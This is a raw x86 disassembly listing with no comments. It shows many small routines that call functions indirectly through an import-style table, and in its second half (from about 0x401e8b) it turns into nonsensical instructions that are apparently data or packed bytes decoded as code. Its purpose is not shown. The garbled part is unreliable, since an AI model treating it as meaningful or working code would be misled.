  4019ba:	pop    eax
  4019bb:	call   DWORD PTR cs:[eax]
  4019be:	pop    edx
  4019bf:	sub    esp,0xffffffb0
  4019c2:	mov    ebp,DWORD PTR [esp]
  4019c5:	add    esp,0x4
  4019c8:	ret    
  4019c9:	add    BYTE PTR [eax],al
  4019cb:	add    BYTE PTR [eax],al
  4019cd:	add    BYTE PTR [eax],al
  4019cf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4019d5:	sub    esp,0x28
  4019d8:	push   edx
  4019d9:	push   0x403010
  4019de:	pop    eax
  4019df:	call   DWORD PTR cs:[eax]
  4019e2:	pop    edx
  4019e3:	push   edx
  4019e4:	push   ebx
  4019e5:	push   eax
  4019e6:	push   ecx
  4019e7:	call   0x401bc8
  4019ec:	add    esp,0xc
  4019ef:	pop    edx
  4019f0:	push   edx
  4019f1:	mov    edi,0x0
  4019f6:	push   edi
  4019f7:	push   0x40304c
  4019fc:	pop    eax
  4019fd:	call   DWORD PTR cs:[eax]
  401a00:	pop    edx
  401a01:	sub    esp,0xffffffd8
  401a04:	mov    ebp,DWORD PTR [esp]
  401a07:	add    esp,0x4
  401a0a:	ret    
  401a0b:	add    BYTE PTR [ebx-0x1374aa01],cl
  401a11:	sub    esp,0x54
  401a14:	push   edx
  401a15:	push   esi
  401a16:	push   edi
  401a17:	push   ebx
  401a18:	call   0x401740
  401a1d:	add    esp,0xc
  401a20:	pop    edx
  401a21:	push   edx
  401a22:	push   0x0
  401a24:	push   0x403020
  401a29:	pop    eax
  401a2a:	call   DWORD PTR cs:[eax]
  401a2d:	pop    edx
  401a2e:	push   edx
  401a2f:	push   0x403004
  401a34:	pop    eax
  401a35:	call   DWORD PTR cs:[eax]
  401a38:	pop    edx
  401a39:	sub    esp,0xffffffac
  401a3c:	mov    ebp,DWORD PTR [esp]
  401a3f:	add    esp,0x4
  401a42:	ret    
	...
  401a4f:	add    BYTE PTR [ebx-0x1374aa01],cl
  401a55:	sub    esp,0x50
  401a58:	push   edx
  401a59:	lea    edx,[edx]
  401a5b:	push   edx
  401a5c:	push   0x403028
  401a61:	pop    eax
  401a62:	call   DWORD PTR cs:[eax]
  401a65:	test   eax,eax
  401a67:	jne    0x401a59
  401a69:	pop    edx
  401a6a:	push   edx
  401a6b:	push   DWORD PTR [edx+0x168]
  401a71:	push   DWORD PTR [edx+0x538]
  401a77:	push   DWORD PTR [edx+0x570]
  401a7d:	push   DWORD PTR [edx+0x12c]
  401a83:	call   0x401b38
  401a88:	add    esp,0x10
  401a8b:	pop    edx
  401a8c:	push   edx
  401a8d:	push   0x0
  401a8f:	push   0x403018
  401a94:	pop    eax
  401a95:	call   DWORD PTR cs:[eax]
  401a98:	pop    edx
  401a99:	sub    esp,0xffffffb0
  401a9c:	mov    ebp,DWORD PTR [esp]
  401a9f:	add    esp,0x4
  401aa2:	ret    
  401aa3:	add    BYTE PTR [ebx-0x1374aa01],cl
  401aa9:	sub    esp,0x4c
  401aac:	push   edx
  401aad:	push   0x0
  401aaf:	push   0x403000
  401ab4:	pop    eax
  401ab5:	call   DWORD PTR cs:[eax]
  401ab8:	pop    edx
  401ab9:	push   edx
  401aba:	push   DWORD PTR [edx+0x28]
  401abd:	push   DWORD PTR [edx+0x3e4]
  401ac3:	push   DWORD PTR [edx+0x4d0]
  401ac9:	push   DWORD PTR [edx+0x80]
  401acf:	call   0x401a50
  401ad4:	add    esp,0x10
  401ad7:	pop    edx
  401ad8:	push   edx
  401ad9:	push   0x0
  401adb:	push   0x403078
  401ae0:	pop    eax
  401ae1:	call   DWORD PTR cs:[eax]
  401ae4:	pop    edx
  401ae5:	sub    esp,0xffffffb4
  401ae8:	mov    ebp,DWORD PTR [esp]
  401aeb:	add    esp,0x4
  401aee:	ret    
  401aef:	add    BYTE PTR [ebx-0x1374aa01],cl
  401af5:	sub    esp,0x2c
  401af8:	push   edx
  401af9:	mov    ebx,0x0
  401afe:	push   ebx
  401aff:	push   0x403020
  401b04:	pop    eax
  401b05:	call   DWORD PTR cs:[eax]
  401b08:	pop    edx
  401b09:	push   edx
  401b0a:	push   esi
  401b0b:	push   DWORD PTR [edx+0x1f8]
  401b11:	call   0x4014dc
  401b16:	add    esp,0x8
  401b19:	pop    edx
  401b1a:	push   edx
  401b1b:	push   0x0
  401b1d:	push   0x403020
  401b22:	pop    eax
  401b23:	call   DWORD PTR cs:[eax]
  401b26:	pop    edx
  401b27:	sub    esp,0xffffffd4
  401b2a:	mov    ebp,DWORD PTR [esp]
  401b2d:	add    esp,0x4
  401b30:	ret    
  401b31:	add    BYTE PTR [eax],al
  401b33:	add    BYTE PTR [eax],al
  401b35:	add    BYTE PTR [eax],al
  401b37:	add    BYTE PTR [ebx-0x1374aa01],cl
  401b3d:	sub    esp,0x58
  401b40:	push   edx
  401b41:	push   0x0
  401b43:	push   0x403058
  401b48:	pop    eax
  401b49:	call   DWORD PTR cs:[eax]
  401b4c:	pop    edx
  401b4d:	push   edx
  401b4e:	push   DWORD PTR [edx+0x480]
  401b54:	push   edi
  401b55:	push   eax
  401b56:	push   DWORD PTR [edx+0x514]
  401b5c:	call   0x4012ec
  401b61:	add    esp,0x10
  401b64:	pop    edx
  401b65:	push   edx
  401b66:	mov    ecx,0x0
  401b6b:	push   ecx
  401b6c:	push   0x40300c
  401b71:	pop    eax
  401b72:	call   DWORD PTR cs:[eax]
  401b75:	pop    edx
  401b76:	sub    esp,0xffffffa8
  401b79:	mov    ebp,DWORD PTR [esp]
  401b7c:	add    esp,0x4
  401b7f:	ret    
  401b80:	mov    edi,edi
  401b82:	push   ebp
  401b83:	mov    ebp,esp
  401b85:	sub    esp,0x58
  401b88:	push   edx
  401b89:	push   0x0
  401b8b:	push   0x40304c
  401b90:	pop    eax
  401b91:	call   DWORD PTR cs:[eax]
  401b94:	pop    edx
  401b95:	push   edx
  401b96:	push   DWORD PTR [edx+0x20]
  401b99:	push   DWORD PTR [edx+0x530]
  401b9f:	push   esi
  401ba0:	push   ebx
  401ba1:	call   0x4013ac
  401ba6:	add    esp,0x10
  401ba9:	pop    edx
  401baa:	push   edx
  401bab:	push   0x0
  401bad:	push   0x40302c
  401bb2:	pop    eax
  401bb3:	call   DWORD PTR cs:[eax]
  401bb6:	pop    edx
  401bb7:	sub    esp,0xffffffa8
  401bba:	mov    ebp,DWORD PTR [esp]
  401bbd:	add    esp,0x4
  401bc0:	ret    
  401bc1:	add    BYTE PTR [eax],al
  401bc3:	add    BYTE PTR [eax],al
  401bc5:	add    BYTE PTR [eax],al
  401bc7:	add    BYTE PTR [ebx-0x1374aa01],cl
  401bcd:	sub    esp,0x48
  401bd0:	push   edx
  401bd1:	push   0x0
  401bd3:	push   0x403020
  401bd8:	pop    eax
  401bd9:	call   DWORD PTR cs:[eax]
  401bdc:	pop    edx
  401bdd:	push   edx
  401bde:	push   DWORD PTR [edx+0x344]
  401be4:	push   ebx
  401be5:	push   esi
  401be6:	push   DWORD PTR [edx+0x170]
  401bec:	call   0x4015c0
  401bf1:	add    esp,0x10
  401bf4:	pop    edx
  401bf5:	push   edx
  401bf6:	push   0x0
  401bf8:	push   0x403008
  401bfd:	pop    eax
  401bfe:	call   DWORD PTR cs:[eax]
  401c01:	pop    edx
  401c02:	sub    esp,0xffffffb8
  401c05:	mov    ebp,DWORD PTR [esp]
  401c08:	add    esp,0x4
  401c0b:	ret    
	...
  401c14:	mov    edi,edi
  401c16:	push   ebp
  401c17:	mov    ebp,esp
  401c19:	sub    esp,0x54
  401c1c:	push   edx
  401c1d:	push   eax
  401c1e:	push   ebx
  401c1f:	call   0x4016f8
  401c24:	add    esp,0x8
  401c27:	pop    edx
  401c28:	push   edx
  401c29:	push   0x403010
  401c2e:	pop    eax
  401c2f:	call   DWORD PTR cs:[eax]
  401c32:	pop    edx
  401c33:	push   edx
  401c34:	mov    ebx,0x0
  401c39:	push   ebx
  401c3a:	push   0x403068
  401c3f:	pop    eax
  401c40:	call   DWORD PTR cs:[eax]
  401c43:	pop    edx
  401c44:	sub    esp,0xffffffac
  401c47:	mov    ebp,DWORD PTR [esp]
  401c4a:	add    esp,0x4
  401c4d:	ret    
	...
  401c5a:	add    BYTE PTR [eax],al
  401c5c:	mov    edi,edi
  401c5e:	push   ebp
  401c5f:	mov    ebp,esp
  401c61:	sub    esp,0x60
  401c64:	push   edx
  401c65:	push   DWORD PTR [edx+0x5f0]
  401c6b:	push   DWORD PTR [edx+0x36c]
  401c71:	push   esi
  401c72:	push   esi
  401c73:	call   0x401524
  401c78:	add    esp,0x10
  401c7b:	pop    edx
  401c7c:	push   edx
  401c7d:	push   0x0
  401c7f:	push   0x403078
  401c84:	pop    eax
  401c85:	call   DWORD PTR cs:[eax]
  401c88:	pop    edx
  401c89:	push   edx
  401c8a:	push   0x0
  401c8c:	push   0x403078
  401c91:	pop    eax
  401c92:	call   DWORD PTR cs:[eax]
  401c95:	pop    edx
  401c96:	sub    esp,0xffffffa0
  401c99:	mov    ebp,DWORD PTR [esp]
  401c9c:	add    esp,0x4
  401c9f:	ret    
  401ca0:	add    BYTE PTR [eax],al
  401ca2:	add    BYTE PTR [eax],al
  401ca4:	mov    edi,edi
  401ca6:	push   ebp
  401ca7:	mov    ebp,esp
  401ca9:	sub    esp,0x30
  401cac:	push   edx
  401cad:	push   0x403004
  401cb2:	pop    eax
  401cb3:	call   DWORD PTR cs:[eax]
  401cb6:	pop    edx
  401cb7:	push   edx
  401cb8:	push   edi
  401cb9:	push   DWORD PTR [edx+0x38c]
  401cbf:	push   edi
  401cc0:	call   0x401248
  401cc5:	add    esp,0xc
  401cc8:	pop    edx
  401cc9:	push   edx
  401cca:	mov    ecx,0x0
  401ccf:	push   ecx
  401cd0:	push   0x403040
  401cd5:	pop    eax
  401cd6:	call   DWORD PTR cs:[eax]
  401cd9:	pop    edx
  401cda:	sub    esp,0xffffffd0
  401cdd:	mov    ebp,DWORD PTR [esp]
  401ce0:	add    esp,0x4
  401ce3:	ret    
	...
  401cf4:	mov    edi,edi
  401cf6:	push   ebp
  401cf7:	mov    ebp,esp
  401cf9:	sub    esp,0x34
  401cfc:	push   edx
  401cfd:	push   0x0
  401cff:	push   0x40300c
  401d04:	pop    eax
  401d05:	call   DWORD PTR cs:[eax]
  401d08:	pop    edx
  401d09:	push   edx
  401d0a:	push   DWORD PTR [edx+0x270]
  401d10:	push   ecx
  401d11:	call   0x4019d0
  401d16:	add    esp,0x8
  401d19:	pop    edx
  401d1a:	push   edx
  401d1b:	push   0x403004
  401d20:	pop    eax
  401d21:	call   DWORD PTR cs:[eax]
  401d24:	pop    edx
  401d25:	sub    esp,0xffffffcc
  401d28:	mov    ebp,DWORD PTR [esp]
  401d2b:	add    esp,0x4
  401d2e:	ret    
  401d2f:	add    BYTE PTR [ebx-0x1374aa01],cl
  401d35:	sub    esp,0x24
  401d38:	push   edx
  401d39:	push   esi
  401d3a:	push   eax
  401d3b:	call   0x401a0c
  401d40:	add    esp,0x8
  401d43:	pop    edx
  401d44:	push   edx
  401d45:	push   0x0
  401d47:	push   0x403020
  401d4c:	pop    eax
  401d4d:	call   DWORD PTR cs:[eax]
  401d50:	pop    edx
  401d51:	push   edx
  401d52:	mov    esi,0x0
  401d57:	push   esi
  401d58:	push   0x403020
  401d5d:	pop    eax
  401d5e:	call   DWORD PTR cs:[eax]
  401d61:	pop    edx
  401d62:	sub    esp,0xffffffdc
  401d65:	mov    ebp,DWORD PTR [esp]
  401d68:	add    esp,0x4
  401d6b:	ret    
  401d6c:	mov    edi,edi
  401d6e:	push   ebp
  401d6f:	mov    ebp,esp
  401d71:	sub    esp,0x4c
  401d74:	push   edx
  401d75:	push   DWORD PTR [edx+0x594]
  401d7b:	push   DWORD PTR [edx+0xc]
  401d7e:	push   eax
  401d7f:	push   DWORD PTR [edx+0x400]
  401d85:	call   0x401860
  401d8a:	add    esp,0x10
  401d8d:	pop    edx
  401d8e:	push   edx
  401d8f:	lea    ecx,[edx]
  401d91:	push   ecx
  401d92:	push   0x403028
  401d97:	pop    eax
  401d98:	call   DWORD PTR cs:[eax]
  401d9b:	test   eax,eax
  401d9d:	jne    0x401d8f
  401d9f:	pop    edx
  401da0:	push   edx
  401da1:	push   0x0
  401da3:	push   0x403020
  401da8:	pop    eax
  401da9:	call   DWORD PTR cs:[eax]
  401dac:	pop    edx
  401dad:	sub    esp,0xffffffb4
  401db0:	mov    ebp,DWORD PTR [esp]
  401db3:	add    esp,0x4
  401db6:	ret    
  401db7:	add    BYTE PTR [ebx-0x1374aa01],cl
  401dbd:	sub    esp,0x24
  401dc0:	push   edx
  401dc1:	push   edi
  401dc2:	push   eax
  401dc3:	push   DWORD PTR [edx+0x56c]
  401dc9:	call   0x401c5c
  401dce:	add    esp,0xc
  401dd1:	pop    edx
  401dd2:	push   edx
  401dd3:	push   0x0
  401dd5:	push   0x403078
  401dda:	pop    eax
  401ddb:	call   DWORD PTR cs:[eax]
  401dde:	pop    edx
  401ddf:	push   edx
  401de0:	push   0x0
  401de2:	push   0x403018
  401de7:	pop    eax
  401de8:	call   DWORD PTR cs:[eax]
  401deb:	pop    edx
  401dec:	sub    esp,0xffffffdc
  401def:	mov    ebp,DWORD PTR [esp]
  401df2:	add    esp,0x4
  401df5:	ret    
  401df6:	add    BYTE PTR [eax],al
  401df8:	mov    edi,edi
  401dfa:	push   ebp
  401dfb:	mov    ebp,esp
  401dfd:	sub    esp,0x38
  401e00:	push   edx
  401e01:	mov    ecx,0x0
  401e06:	push   ecx
  401e07:	push   0x40304c
  401e0c:	pop    eax
  401e0d:	call   DWORD PTR cs:[eax]
  401e10:	pop    edx
  401e11:	push   edx
  401e12:	push   eax
  401e13:	push   DWORD PTR [edx+0x30]
  401e16:	push   ecx
  401e17:	push   eax
  401e18:	call   0x401c14
  401e1d:	add    esp,0x10
  401e20:	pop    edx
  401e21:	push   edx
  401e22:	mov    ebx,0x0
  401e27:	push   ebx
  401e28:	push   0x403068
  401e2d:	pop    eax
  401e2e:	call   DWORD PTR cs:[eax]
  401e31:	pop    edx
  401e32:	sub    esp,0xffffffc8
  401e35:	mov    ebp,DWORD PTR [esp]
  401e38:	add    esp,0x4
  401e3b:	ret    
	...
  401e44:	mov    edi,edi
  401e46:	push   ebp
  401e47:	mov    ebp,esp
  401e49:	sub    esp,0x30
  401e4c:	push   edx
  401e4d:	mov    eax,0x0
  401e52:	push   eax
  401e53:	push   0x40304c
  401e58:	pop    eax
  401e59:	call   DWORD PTR cs:[eax]
  401e5c:	pop    edx
  401e5d:	push   edx
  401e5e:	push   DWORD PTR [edx+0x4a0]
  401e64:	push   DWORD PTR [edx+0x4c]
  401e67:	call   0x401df8
  401e6c:	add    esp,0x8
  401e6f:	pop    edx
  401e70:	push   edx
  401e71:	mov    edx,0x0
  401e76:	push   edx
  401e77:	push   0x403040
  401e7c:	pop    eax
  401e7d:	call   DWORD PTR cs:[eax]
  401e80:	pop    edx
  401e81:	sub    esp,0xffffffd0
  401e84:	mov    ebp,DWORD PTR [esp]
  401e87:	add    esp,0x4
  401e8a:	ret    
  401e8b:	add    al,al
  401e8d:	adc    DWORD PTR [ebp+0x312ef6ea],esp
  401e93:	jno    0x401e24
  401e95:	fmul   QWORD PTR [eax-0x1bfe1d5b]
  401e9b:	sar    DWORD PTR [esi+0x2252a993],cl
  401ea1:	sbb    eax,0xf7bc730
  401ea6:	enter  0xeffd,0x9e
  401eaa:	mov    ecx,0xc7c70097
  401eaf:	add    DWORD PTR [eax],eax
  401eb1:	mov    edi,0xc6e30001
  401eb7:	jg     0x401efa
  401eb9:	retf   0xa27e
  401ebc:	mov    ebp,0x310580a8
  401ec1:	imul   esi,eax,0xffffffe2
  401ec4:	add    DWORD PTR ds:0x251691a3,ecx
  401eca:	gs ins BYTE PTR es:[edi],dx
  401ecc:	pop    eax
  401ecd:	push   edi
  401ece:	inc    eax
  401ecf:	push   ss
  401ed0:	or     DWORD PTR [edx+0x32],eax
  401ed3:	imul   ecx,DWORD PTR [ecx],0xffffffff
  401ed6:	mov    edx,0xbcd552e7
  401edb:	ins    BYTE PTR es:[edi],dx
  401edc:	mov    esi,0x81d8533b
  401ee1:	push   esp
  401ee2:	js     0x401edb
  401ee4:	pop    edx
  401ee5:	call   0xf444a4da
  401eea:	mov    ch,0xa0
  401eec:	jge    0x401ed2
  401eee:	adc    BYTE PTR [eax],al
  401ef0:	add    DWORD PTR [eax],edx
  401ef2:	adc    al,0x1d
  401ef4:	sbb    ebp,DWORD PTR [edi+0x468a0000]
  401efa:	(bad)  
  401efb:	adc    BYTE PTR [esi+edx*4],dl
  401efe:	and    eax,0x60f2ae1
  401f03:	call   0x3110:0x20092406
  401f0a:	sbb    edx,DWORD PTR [edi+0x76dd5ba9]
  401f10:	ins    DWORD PTR es:[edi],dx
  401f11:	mov    DWORD PTR [eax+0x13],esp
  401f14:	xor    eax,0x2102650d
  401f19:	add    BYTE PTR [edx+eax*1],al
  401f1c:	and    eax,0x5c1d9a32
  401f21:	jbe    0x401f38
  401f23:	push   eax
  401f24:	add    BYTE PTR [edx+0x702b6291],0xc4
  401f2b:	xchg   ebx,eax
  401f2c:	adc    DWORD PTR [eax],eax
  401f2e:	add    al,ah
  401f30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f31:	push   0xff6b6a00
  401f36:	push   ebp
  401f37:	push   ss
  401f38:	pushf  
  401f39:	lods   eax,DWORD PTR ds:[esi]
  401f3a:	cli    
  401f3b:	cdq    
  401f3c:	cwde   
  401f3d:	add    eax,0xb5dedbf8
  401f42:	aam    0xf9
  401f44:	stc    
  401f45:	aam    0xf
  401f47:	sub    eax,0xcffb9a7
  401f4c:	push   esi
  401f4d:	ret    
  401f4e:	call   0xc428ace0
  401f53:	stc    
  401f54:	add    al,BYTE PTR [edi-0x238cdecc]
  401f5a:	jl     0x401fb6
  401f5c:	add    eax,0x3f6f00fb
  401f61:	call   0x6ab2aa66
  401f66:	add    BYTE PTR [edi+0x6b],ch
  401f69:	call   FWORD PTR [edi]
  401f6b:	pushf  
  401f6c:	cmp    al,0x8a
  401f6e:	stos   BYTE PTR es:[edi],al
  401f6f:	sub    BYTE PTR [eax+ebx*1+0x3c6b3d97],ah
  401f76:	adc    eax,0x47cca74
  401f7b:	push   ecx
  401f7c:	push   es
  401f7d:	pop    es
  401f7e:	(bad)  [ecx+0x78]
  401f81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f82:	add    BYTE PTR [ecx-0x364fb057],ch
  401f88:	loope  0x401f72
  401f8a:	sbb    dh,bl
  401f8c:	int3   
  401f8d:	cmp    al,0x8d
  401f8f:	pop    es
  401f90:	add    ebp,ebx
  401f92:	retf   
  401f93:	push   es
  401f94:	push   edi
  401f95:	test   DWORD PTR [esi+0x73],0x22581962
  401f9c:	inc    ecx
  401f9d:	dec    ecx
  401f9e:	mov    dl,0x4e
  401fa0:	ins    DWORD PTR es:[edi],dx
  401fa1:	loope  0x401fb8
  401fa3:	sbb    al,0x69
  401fa5:	xor    al,0x6a
  401fa7:	xor    al,0x0
  401fa9:	jno    0x40200b
  401fab:	push   ebx
  401fac:	push   ebx
  401fad:	push   es
  401fae:	pusha  
  401faf:	je     0x401fa6
  401fb1:	jl     0x401fb8
  401fb3:	stos   DWORD PTR es:[edi],eax
  401fb4:	aas    
  401fb5:	push   esp
  401fb6:	cmp    ebp,DWORD PTR [esi]
  401fb8:	push   ebx
  401fb9:	add    DWORD PTR [eax],ecx
  401fbb:	ds aas 
  401fbd:	push   cs
  401fbe:	add    ch,BYTE PTR [esp+eax*1+0x77e1cddc]
  401fc5:	cmp    al,0x2f
  401fc7:	or     BYTE PTR [esi-0xe],bl
  401fca:	jmp    DWORD PTR [ebx-0x49a93d2c]
  401fd0:	je     0x401f60
  401fd2:	mov    bh,0x93
  401fd4:	xchg   esp,eax
  401fd5:	lods   eax,DWORD PTR cs:[esi]
  401fd7:	xor    esi,DWORD PTR [edi-0x577bc9f]
  401fdd:	sbb    esi,esi
  401fdf:	dec    BYTE PTR [esi-0x29]
  401fe2:	test   BYTE PTR [edi+0x72a00e52],bh
  401fe8:	ss dec ebx
  401fea:	ret    0x8e1c
  401fed:	xchg   edi,edi
  401fef:	jnp    0x401fc4
  401ff1:	out    0xc4,eax
  401ff3:	test   DWORD PTR [ecx],eax
  401ff5:	(bad)  
  401ff6:	pop    ebx
  401ff7:	arpl   bx,ax
  401ff9:	in     al,dx
  401ffa:	arpl   WORD PTR [ebp+0x76],si
  401ffd:	call   0x14bb6426
  402002:	push   DWORD PTR [ebp+0x66]
  402005:	je     0x402072
  402007:	jnp    0x402011
  402009:	test   al,dl
  40200b:	inc    eax
  40200c:	fmul   QWORD PTR [edi+0x50253a9]
  402012:	test   ecx,ebx
  402014:	cmp    DWORD PTR [ebp+0x6],edx
  402017:	push   es
  402018:	push   edi
  402019:	pop    es
  40201a:	or     BYTE PTR [ebx],dh
  40201c:	ins    DWORD PTR es:[edi],dx
  40201d:	int3   
  40201e:	add    cl,BYTE PTR [eax+ebx*2]
  402021:	or     BYTE PTR [ebx-0x8],cl
  402024:	aas    
  402025:	das    
  402026:	mov    al,ds:0xc5a758ff
  40202b:	jo     0x402078
  40202d:	dec    ecx
  40202e:	mov    edx,0x29e958bd
  402033:	mov    DWORD PTR [ecx],0x1e88ae9
  402039:	xor    DWORD PTR [eax+0x186968],0x28760000
  402043:	push   esi
  402044:	ficom  DWORD PTR [ebx-0x78e6f002]
  40204a:	dec    DWORD PTR [ebx-0x220c9fff]
  402050:	add    al,0xff
  402052:	add    BYTE PTR fs:[ecx-0x75],bl
  402056:	inc    eax
  402057:	cmp    al,0x80
  402059:	add    BYTE PTR [edi+0x34146061],al
  40205f:	(bad)
  402063:	scas   eax,DWORD PTR es:[edi]
  402064:	jnp    0x40204d
  402066:	and    al,0x88
  402068:	dec    ecx
  402069:	sbb    BYTE PTR [edi-0x3477a706],al
  40206f:	shl    al,0xef
  402072:	mov    bl,BYTE PTR [eax+0x6d]
  402075:	out    dx,eax
  402076:	out    dx,eax
  402077:	cmp    DWORD PTR [esi-0x9],edx
  40207a:	inc    esi
  40207b:	imul   edi,DWORD PTR [eax+0x44],0xa1190ea1
  402082:	fs xchg edx,ecx
  402085:	xor    BYTE PTR [ecx+0x65767178],cl
  40208b:	push   esp
  40208c:	std    
  40208d:	jbe    0x40208c
  40208f:	or     BYTE PTR [ecx],al
  402091:	pop    edi
  402092:	jmp    0x7e1c:0x79bdd2b0
  402099:	je     0x402037
  40209b:	mov    dh,0x3a
  40209d:	call   0x791a59f2
  4020a2:	pop    eax
  4020a3:	add    al,0x3
  4020a5:	pop    eax
  4020a6:	js     0x40209c
  4020a8:	mov    eax,DWORD PTR gs:[esi+eiz*1]
  4020ac:	in     al,dx
  4020ad:	add    BYTE PTR [edi+0x424010f],ch
  4020b3:	cmp    BYTE PTR [edx+0x64500424],cl
  4020b9:	(bad)  
  4020ba:	out    0x14,eax
  4020bc:	in     al,dx
  4020bd:	xor    bl,al
  4020bf:	inc    ebp
  4020c0:	dec    ebx
  4020c1:	mov    BYTE PTR [ebp+0xb],al
  4020c4:	xor    DWORD PTR [esi+0x7472b98b],0xf8f70373
  4020ce:	or     bh,dl
  4020d0:	mov    al,BYTE PTR [ecx-0x70916601]
  4020d6:	test   al,0x7a
  4020d8:	test   eax,0xb6c37e53
  4020dd:	adc    DWORD PTR [ebx-0x56],0x235457a9
  4020e4:	fisub  DWORD PTR [esi]
  4020e6:	adc    BYTE PTR [esi-0x9],dl
  4020e9:	fwait
  4020ea:	mov    BYTE PTR [esi],ah
  4020ec:	sub    edi,DWORD PTR [esi]
  4020ee:	dec    BYTE PTR [eax]
  4020f0:	xlat   BYTE PTR ds:[ebx]
  4020f1:	or     BYTE PTR [ebx+0x4b],0x91
  4020f5:	fisub  DWORD PTR [edi+0x543f7f]
  4020fb:	or     DWORD PTR [edi+0x7],edx
  4020fe:	or     BYTE PTR [edx+ebx*8],bh
  402101:	or     dl,al
  402103:	aas    
  402104:	push   ecx
  402105:	adc    eax,0x657cd8d
  40210a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40210b:	xchg   ebx,eax
  40210c:	pop    ebx
  40210d:	cdq    
  40210e:	or     al,dl
  402110:	mov    ch,0x9e
  402112:	add    al,0x57
  402114:	add    DWORD PTR [ecx+0xd70019b],ebp
  40211a:	inc    esp
  40211b:	add    eax,DWORD PTR [eax]
  40211d:	popa   
  40211e:	jb     0x40211b
  402120:	(bad)  
  402121:	jg     0x402198
  402123:	std    
  402124:	mov    dh,BYTE PTR [ebx+ebp*2+0x0]
  402128:	test   eax,0xa9f8f1c
  40212d:	hlt    
  40212e:	push   esi
  40212f:	or     eax,0xb10f0a02
  402134:	or     DWORD PTR [edi-0x29aaaaff],ebp
  40213a:	cmp    DWORD PTR [ebx-0x8],eax
  40213d:	dec    ecx
  40213e:	loop   0x4020db
  402140:	mov    ds:0x78605cea,al
  402145:	sar    ch,1
  402147:	pop    esp
  402148:	adc    BYTE PTR [eax],ah
  40214a:	aaa    
  40214b:	ja     0x4021a3
  40214d:	cmp    edx,edx
  40214f:	mov    esi,0x590f8494
  402154:	add    al,0xa4
  402156:	add    BYTE PTR [eax],al
  402158:	add    DWORD PTR [ebx-0x495ed1ee],ecx
  40215e:	mov    eax,DWORD PTR [ebp-0x7e7bf08e]
  402164:	add    BYTE PTR [edi+ecx*1-0x7452080b],0xf8
  40216c:	cld    
  40216d:	jo     0x40216c
  40216f:	js     0x4021bf
  402171:	add    BYTE PTR [edx+0x543b0351],ch
  402177:	lods   al,BYTE PTR ds:[esi]
  402178:	imul   edx,DWORD PTR [edx+ebp*2],0xf8835850
  40217f:	add    al,0x55
  402181:	add    BYTE PTR [edi+0x6a14693f],0x50
  402188:	pop    eax
  402189:	adc    DWORD PTR [esp],0x57811425
  402190:	add    BYTE PTR [esi+0x1c],dl
  402193:	jmp    FWORD PTR [ecx-0x859f100]
  402199:	jno    0x40215f
  40219b:	add    al,0xdd
  40219d:	add    dl,bh
  40219f:	inc    esp
  4021a0:	ins    DWORD PTR es:[edi],dx
  4021a1:	cmp    ah,cl
  4021a3:	mov    eax,0xe54462f2
  4021a8:	int3   
  4021a9:	lods   eax,DWORD PTR ds:[esi]
  4021aa:	push   esi
  4021ab:	mov    ah,0x7d
  4021ad:	adc    eax,0xff0ea6ff
  4021b2:	and    al,0x1c
  4021b4:	sbb    al,0xe3
  4021b6:	out    dx,al
  4021b7:	pop    ecx
  4021b8:	xlat   BYTE PTR ds:[ebx]
  4021b9:	stos   BYTE PTR es:[edi],al
  4021ba:	mov    BYTE PTR [ebx],0x56
  4021bd:	jbe    0x4021d3
  4021bf:	jb     0x40218f
  4021c1:	cmp    BYTE PTR [edx+0x41],dl
  4021c4:	adc    DWORD PTR [eax],eax
  4021c6:	aas    
  4021c7:	mov    bl,0x6a
  4021c9:	push   ebx
  4021ca:	push   eax
  4021cb:	dec    esi
  4021cd:	cmp    BYTE PTR [eax+edi*8],al
  4021d0:	adc    DWORD PTR [eax],eax
  4021d2:	aas    
  4021d3:	mov    cl,0x84
  4021d5:	jae    0x4021d7
  4021d7:	adc    BYTE PTR [ecx],dl
  4021d9:	add    bl,bl
  4021db:	push   ecx
  4021dc:	pop    eax
  4021dd:	add    BYTE PTR [ebp+0xc],dl
  4021e0:	push   edi
  4021e1:	or     al,0xa7
  4021e3:	push   esp
  4021e4:	ficom  WORD PTR [ecx-0x491c24d4]
  4021ea:	test   eax,0x21cde36e
  4021ef:	pushf  
  4021f0:	jae    0x4021c8
  4021f2:	scas   al,BYTE PTR es:[edi]
  4021f3:	les    ecx,FWORD PTR [edi-0x15]
  4021f6:	mov    edi,0xe89b497e
  4021fb:	mov    eax,DWORD PTR [ecx]
  4021fd:	call   0xec3f68fd
  402202:	push   edx
  402203:	pop    ds
  402204:	push   ds
  402205:	mov    ecx,0xff0a17ff
  40220a:	(bad)  
  40220b:	jmp    FWORD PTR [eax+0x1e1f846]
  402211:	pop    es
  402212:	push   ecx
  402213:	adc    dh,0xe8
  402216:	add    BYTE PTR [edx+ebx*2-0x6124348c],cl
  40221d:	cmp    eax,0xe801d08b
  402222:	into   
  402223:	inc    esi
  402224:	inc    edi
  402226:	fs (bad) 
  402228:	jb     0x40226b
  40222a:	pop    ss
  40222b:	inc    ecx
  40222c:	mov    esi,0xf2bfcae8
  402231:	scas   eax,DWORD PTR es:[edi]
  402232:	ds aaa 
  402234:	rol    BYTE PTR [eax],0x54
  402237:	in     al,0x2a
  402239:	add    eax,0x808923c5
  40223e:	sar    DWORD PTR [eax-0x79],0x98
  402242:	cvtdq2ps xmm1,xmm3
  402245:	dec    esi
  402246:	sub    al,0xf2
  402248:	dec    eax
  402249:	add    DWORD PTR [eax],ebx
  40224b:	mov    al,0xbe
  40224d:	stc    
  40224e:	int3   
  40224f:	inc    eax
  402250:	or     edi,DWORD PTR [ecx-0x8123dc]
  402256:	(bad)  
  402257:	(bad)  
  402258:	out    dx,eax
  402259:	dec    eax
  40225a:	repz ret 
  40225c:	or     DWORD PTR [ebp+0xe],ebx
  40225f:	pop    es
  402260:	or     DWORD PTR [ecx-0x9149af],edi
  402266:	(bad)  
  402267:	jmp    DWORD PTR [ebp-0x857fe9]
  40226d:	jg     0x4022d1
  40226f:	sub    eax,0x3c9e9551
  402274:	xchg   ecx,eax
  402275:	mov    al,ds:0xc8a739f4
  40227a:	rcl    DWORD PTR [ecx+0x1],0x48
  40227e:	push   esp
  40227f:	mov    DWORD PTR [edx+0x1004876],ecx
  402285:	dec    eax
  402286:	jbe    0x402219
  402288:	xchg   edx,eax
  402289:	push   esp
  40228a:	dec    eax
  40228b:	add    BYTE PTR [ecx],al
  40228d:	dec    eax
